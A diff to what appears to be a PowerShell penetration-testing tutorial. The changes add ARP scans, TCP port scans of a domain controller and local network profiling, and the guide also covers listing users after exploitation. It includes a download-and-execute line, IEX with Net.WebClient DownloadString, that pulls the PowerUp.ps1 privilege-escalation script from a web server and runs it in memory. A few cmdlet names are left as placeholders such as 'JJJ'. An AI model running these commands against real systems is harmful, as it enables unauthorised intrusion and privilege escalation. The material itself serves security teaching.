@@ -108,10 +108,10 @@ SYNTAX
     Get-Location [-Stack] [-StackName <string[]>] [<CommonParameters>]
 ```
 
-Once you have a PowerShell shell then you can use the following to download files over the Network.
+Once you have a PowerShell shell then you can use the following to download files over the Network. In the following we will download the file PowerUp.ps1 from the web server www.snowcapcyber.co.uk to the local machine.
 
 ```powershell
-PS C:\> IEX
+PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://www.snowcapcyber.co.uk/PowerUp.ps1')
 ```
 
 Now that we have the ability to profile PowerShell and find/install modules we can begin to use it to perform a penetration test.
@@ -164,8 +164,6 @@ The trick when creating and using tools for Penetration Testing is not to reinve
 
 * [PowerShell IPv4 Port Scanner](https://github.com/BornToBeRoot/PowerShell_IPv4PortScanner)
 
-* [PowerShell TCP Port Scanner](https://github.com/zuphzuph/PowerShell-TCP-Port-Scanner)
-
 * [TCP Port Scanner](https://gist.github.com/raandree/60a6677d0a97ea992a8a0b37681d6365)
 
 * [TCP/UDP Port Scanner](https://github.com/calebstewart/Net-Scan)
@@ -174,19 +172,30 @@ The trick when creating and using tools for Penetration Testing is not to reinve
 
 * [PowerCat](https://github.com/besimorhino/powercat)
 
-It should be noted that many of the tools listed above will be detected, and classified as malicious software, by many anti-virus products. However, from a tools and techniques perspective they are useful and add value to out tool set. A Penetration Test begins with us profiling what is on a network. To achieve this we use a technique called an Arp scan. We can achieve this via the Invoke-ARPScan cmdlet from the Posh-SecMod module.
+It should be noted that many of the tools listed above will be detected, and classified as malicious software, by many anti-virus products. However, from a tools and techniques perspective they are useful and add value to out tool set. A Penetration Test begins with us profiling what is on a network. To achieve this we use a technique called an ARP scan. To achieve this we can make use of Get-NetNeighbor cmdlet.
+```powershell
+PS C:\> Get-NetNeighbor -AddressFamily IPv4
+
+ifIndex IPAddress                                          LinkLayerAddress      State       PolicyStore
+------- ---------                                          ----------------      -----       -----------
+13      192.168.2.254                                      00:67:32:90:A1:6F     Permanent   ActiveStore
+13      192.168.1.61                                       05:67:87:AF:89:C1     Permanent   ActiveStore
+13      192.168.2.11                                       00:AF:81:C0:41:21     Stale       ActiveStore
+```
+
+We can also make use of the Invoke-ARPScan cmdlet from the Posh-SecMod module.
 ```powershell
 PS C:\> Import-Module .\Posh-SecMod.psd1
-PS C:\> Invoke-ARPScan -CIDR 192.168.72.0/24
+PS C:\> Invoke-ARPScan -CIDR 192.168.2.0/24
 
 MAC                            Address
 ---                            -------
-00:AF:81:C0:41:21              192.168.71.10
-05:67:87:AF:89:C1              192.168.71.61
-00:67:32:90:A1:6F              192.168.71.254
+00:AF:81:C0:41:21              192.168.1.11
+05:67:87:AF:89:C1              192.168.1.61
+00:67:32:90:A1:6F              192.168.1.254
 ```
 
-We can use some of these tools to perform a quick TCP port scan of the target machine. The IPv4PortScan. tool allows is to specify and start and end port number for our scan.
+We can use some of these tools to perform a quick TCP port scan of the target machine. The [IPv4PortScan](https://github.com/BornToBeRoot/PowerShell_IPv4PortScanner) tool allows is to specify and start and end port number for our scan.
 
 ```powershell
 PS C:\> IPv4PortScan.ps1 -Computername 172.16,24.145 -StartPort 1 -EndPort 1024
@@ -206,6 +215,22 @@ Status             : Open
 PS C:\>
 ```
 
+We can also use the [Start-PortScan](https://gist.github.com/raandree/60a6677d0a97ea992a8a0b37681d6365) tool as a TCP port scanner. This tool allows us to specify a start TCP port and a stop TCP port.
+```powershell
+PS C:\> Start-PortScan.ps1 -ComputerName f1dc2 -StartPort 1 -EndPort 1000
+    ComputerName IP V4 Address Port Protocol Open ServiceName    ServiceDescription                    
+    ------------ ------------- ---- -------- ---- -----------    ------------------                    
+    f1dc2        192.168.13.4  53   TCP      True domain         Domain Name Server                    
+    f1dc2        192.168.13.4  88   TCP      True kerberos       Kerberos                              
+    f1dc2        192.168.13.4  90   TCP      True dnsix          DNSIX Securit Attribute Token Map     
+    f1dc2        192.168.13.4  135  TCP      True epmap          DCE endpoint resolution               
+    f1dc2        192.168.13.4  139  TCP      True netbios-ssn    NETBIOS Session Service               
+    f1dc2        192.168.13.4  389  TCP      True ldap           Lightweight Directory Access Protocol
+    f1dc2        192.168.13.4  445  TCP      True microsoft-ds   Microsoft-DS                          
+    f1dc2        192.168.13.4  464  TCP      True kpasswd        kpasswd                               
+    f1dc2        192.168.13.4  593  TCP      True http-rpc-epmap HTTP RPC Ep Map                       
+    f1dc2        192.168.13.4  636  TCP      True ldaps          ldap protocol over TLS/SSL (was sldap)
+```
 
 We can also use the Test-Connection PowerShell command to perform a test on a single port as follows:
 ```powershell
@@ -363,7 +388,7 @@ PS C:\>
 
 Once we have exploited a system we start to profile a system using a set of PowerShell commands. We can start be listing the users on the target system.
 ```powershell
-PS C:\> get-localuser
+PS C:\> Get-LocalUser
 Name               Enabled Description
 ----               ------- -----------
 Administrator      False   Built-in account for administering the computer/domain
@@ -376,7 +401,7 @@ WDAGUtilityAccount False   A user account managed and used by the system for Win
 
 Now that we have a list of users we profile a given user in greater detail. To achieve this we use the JJJ command and specify the username that we are interested in.
 ```powershell
-PS C:\> get-localuser -name "Andrew Blyth" | select *
+PS C:\> Get-LocalUser -name "Andrew Blyth" | select *
 AccountExpires         :
 Description            :
 Enabled                : True
@@ -467,9 +492,23 @@ Profiling the target system starts with us profiling the execution policy. The E
 ```powershell
 PS C:\>  Get-ExecutionPolicy
 ```
+
 If you wish to change the PowerShell policy only to the current user, use the following command instead.
 ```powershell
 PS C:\>  Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+```
+
+Profiling a local system starts with is identifying how the device's device is configured. To achieve this we can make use of the JJ PowerShell cmdlet.
+```powershell
+PS C:\> Get-NetIPConfiguration
+
+InterfaceAlias       : Ethernet0
+InterfaceIndex       : 13
+InterfaceDescription : Intel(R) 82574L Gigabit Network Connection
+NetProfile.Name      : snowcapcyber.co.uk
+IPv4Address          : 192.168.2.101
+IPv4DefaultGateway   : 192.168.2.254
+DNSServer            : 192.168.2.11
 ```
 
 Profiling the target system continues with us identifying the TCP and UDP ports that are being used. To identify all TCP ports that are being used we can use the  Get-NetTCPConnection PowerShell command as follows.
